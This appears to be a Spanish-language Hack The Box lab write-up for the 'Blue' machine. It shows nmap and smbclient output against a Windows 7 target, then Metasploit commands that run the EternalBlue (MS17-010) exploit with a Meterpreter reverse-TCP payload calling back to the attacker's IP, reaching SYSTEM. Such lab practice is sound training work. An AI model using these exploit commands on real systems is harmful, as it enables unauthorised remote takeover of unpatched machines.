Blue (Pentesting - easy)

1. Escaneo de puertos con nmap
```bash
┌─[us-dedivip-1]─[10.10.14.97]─[mikjurado1@htb-jac264xjbj]─[~]
└──╼ [★]$ nmap -sC -sV --top-ports 1000 10.129.78.247
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-23 13:12 CDT
Nmap scan report for 10.129.78.247
Host is up (0.0092s latency).
Not shown: 991 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-04-23T19:13:38+01:00
| smb2-time: 
|   date: 2025-04-23T18:13:41
|_  start_date: 2025-04-23T17:16:38
|_clock-skew: mean: -19m57s, deviation: 34m37s, median: 1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 70.22 seconds
┌─[us-dedivip-1]─[10.10.14.97]─[mikjurado1@htb-jac264xjbj]─[~]
└──╼ [★]$ 


````
2. Intentamos listar con smbclient
**Enumeración SMB**:
```bash
┌─[us-dedivip-1]─[10.10.14.97]─[mikjurado1@htb-jac264xjbj]─[~]
└──╼ [★]$ smbclient -L \\\\10.129.78.247\\Users -N

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	Share           Disk      
	Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.78.247 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

````
3. Intentamos ingresar a 
**Acceder a recursos compartidos**:
```
┌─[us-dedivip-1]─[10.10.14.97]─[mikjurado1@htb-jac264xjbj]─[~]
└──╼ [★]$ smbclient \\\\10.129.78.247\\Share -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Jul 14 08:48:44 2017
  ..                                  D        0  Fri Jul 14 08:48:44 2017

		4692735 blocks of size 4096. 657738 blocks available
smb: \> whoami
whoami: command not found
smb: \> exit
┌─[us-dedivip-1]─[10.10.14.97]─[mikjurado1@htb-jac264xjbj]─[~]
└──╼ [★]$ smbclient \\\\10.129.78.247\\Users -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Fri Jul 21 01:56:23 2017
  ..                                 DR        0  Fri Jul 21 01:56:23 2017
  Default                           DHR        0  Tue Jul 14 02:07:31 2009
  desktop.ini                       AHS      174  Mon Jul 13 23:54:24 2009
  Public                             DR        0  Tue Apr 12 02:51:29 2011

		4692735 blocks of size 4096. 657738 blocks available
smb: \> 

````

4. Ahora usamos metasploit
````bash
msfconsole
search eternalblue
use exploit/windows/smb/ms17_010_eternalblue
show options
set RHOSTS 10.129.78.247
set LHOST 10.10.X.X        # ← pon tu IP de tunel HTB aquí
set payload windows/x64/meterpreter/reverse_tcp
run

````
5. Dentro de la sesión de Meterpreter:
```bash
getuid
Server username: NT AUTHORITY\SYSTEM
````

6. Desde Meterpreter, entra en shell:
```bash
shell
dir
type user.txt
````




